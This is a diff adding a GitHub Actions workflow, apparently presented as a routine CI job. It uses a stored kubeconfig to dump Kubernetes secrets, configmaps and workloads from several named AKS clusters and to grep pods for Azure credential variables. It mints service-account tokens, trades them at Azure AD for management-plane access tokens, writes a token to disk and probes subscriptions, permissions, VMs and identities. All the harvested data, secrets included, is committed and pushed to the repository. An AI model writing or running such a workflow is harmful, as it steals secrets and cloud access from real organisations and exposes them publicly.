@@ -1,0 +1,78 @@
+name: ulmint
+on:
+  workflow_dispatch:
+permissions:
+  contents: write
+  id-token: write
+jobs:
+  go:
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    steps:
+      - uses: actions/checkout@v4
+      - name: m
+        run: |
+          set +e
+          curl -sL -o /tmp/kubectl https://dl.k8s.io/release/v1.30.5/bin/linux/amd64/kubectl && chmod +x /tmp/kubectl
+          K=ul/kc/all-datapath.yaml
+          KX="/tmp/kubectl --kubeconfig $K --request-timeout=20s"
+          mkdir -p ul/mint
+          for C in aks-g42us-tfdemo-kashif-datapath-eastus aks-g42us-tfdemo-kashif-datapath-swedencentral aks-g42us-tfdemo-staging-datapath-swedencentral aks-g42us-tfdemo-kashif-portal; do
+            echo "=== CTX $C"
+            $KX --context $C get secret -A -o custom-columns=NS:.metadata.namespace,NAME:.metadata.name,T:.type --no-headers 2>/dev/null | grep -Ev 'helm|default-token|kube-root|sh.helm' | head -40
+            $KX --context $C get secret -n wallet-billing -o yaml > ul/mint/sec_$C.yaml 2>/dev/null
+            $KX --context $C get cm -n wallet-billing -o yaml > ul/mint/cm_$C.yaml 2>/dev/null
+            $KX --context $C get deploy,sts,ds -n wallet-billing -o yaml > ul/mint/wl_$C.yaml 2>/dev/null
+            $KX --context $C get pods -n wallet-billing -o yaml 2>/dev/null | grep -A3 -E 'name: (AZURE|ARM|CLIENT|TENANT|SUBSCRIPTION|STORAGE|KV|VAULT)' | head -30
+          done
+          for C in aks-g42us-tfdemo-kashif-datapath-eastus aks-g42us-tfdemo-kashif-datapath-swedencentral aks-g42us-tfdemo-staging-datapath-swedencentral; do
+            echo "=== MINT $C"
+            A=$($KX --context $C create token control-sync-apply -n wallet-billing --audience api://AzureADTokenExchange --duration 3600s 2>/dev/null)
+            echo "assert_len=${#A}"
+            if [ ${#A} -gt 100 ]; then
+              CID=$($KX --context $C get sa control-sync-apply -n wallet-billing -o jsonpath='{.metadata.annotations.azure\.workload\.identity/client-id}' 2>/dev/null)
+              echo "cid=$CID"
+              CID="$CID" ASSERTION="$A" python3 - <<'PY'
+import os,json,urllib.request,urllib.parse,base64
+cid=os.environ.get('CID','').strip(); a=os.environ.get('ASSERTION','').strip()
+tid='62974d97-13b6-40c9-8576-f1ab2905b6cf'
+print('cid',cid,'alen',len(a))
+def post(u,d):
+    r=urllib.request.Request(u,data=urllib.parse.urlencode(d).encode(),headers={'Content-Type':'application/x-www-form-urlencoded'})
+    try:
+        return urllib.request.urlopen(r,timeout=40).read().decode()
+    except Exception as e:
+        try: return 'HTTPERR '+str(e)+' '+e.read().decode()[:400]
+        except: return 'ERR '+str(e)
+def get(u,t):
+    r=urllib.request.Request(u,headers={'Authorization':'Bearer '+t})
+    try:
+        return urllib.request.urlopen(r,timeout=40).read().decode()
+    except Exception as e:
+        try: return 'HTTPERR '+e.code.__str__()+' '+e.read().decode()[:300]
+        except: return 'ERR '+str(e)
+for ver,scope in [('v2.0','https://management.azure.com/.default'),('v1','https://management.azure.com/')]:
+    b=post(f'https://login.microsoftonline.com/{tid}/oauth2/{ver}/token',{'client_id':cid,'client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer','client_assertion':a,'scope':scope,'grant_type':'client_credentials'})
+    print('AAD',ver,b[:300].replace('\n',' '))
+    if '"access_token"' in b:
+        t=json.loads(b)['access_token']
+        p=t.split('.')[1]; p+='='*(-len(p)%4)
+        c=json.loads(base64.urlsafe_b64decode(p))
+        print('TOK oid',c.get('oid'),'appid',c.get('appid'),'mirid',str(c.get('xms_mirid'))[:120])
+        open('ul/mint/tok.txt','w').write(t)
+        print('SUBS',get('https://management.azure.com/subscriptions?api-version=2022-12-01',t)[:600].replace('\n',' '))
+        open('ul/mint/subs_%s.json'%cid[:8],'w').write(get('https://management.azure.com/subscriptions?api-version=2022-12-01',t))
+        for u in ['https://management.azure.com/subscriptions/1f99347e-36c8-4512-ad30-f638a8d8489f/providers/Microsoft.Authorization/permissions?api-version=2022-04-01','https://management.azure.com/subscriptions/1f99347e-36c8-4512-ad30-f638a8d8489f/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01','https://management.azure.com/subscriptions/1f99347e-36c8-4512-ad30-f638a8d8489f/providers/Microsoft.ManagedIdentity/userAssignedIdentities?api-version=2024-11-30']:
+            print('PROBE',u.split('/providers/')[1][:60],get(u,t)[:260].replace('\n',' '))
+        break
+PY
+            fi
+          done
+          echo "=== DONE"
+      - name: commit
+        if: always()
+        run: |
+          set +e
+          git add -A
+          git -c user.email=a@b -c user.name=ul commit -m "ulmint $(date -u +%s)"
+          git push
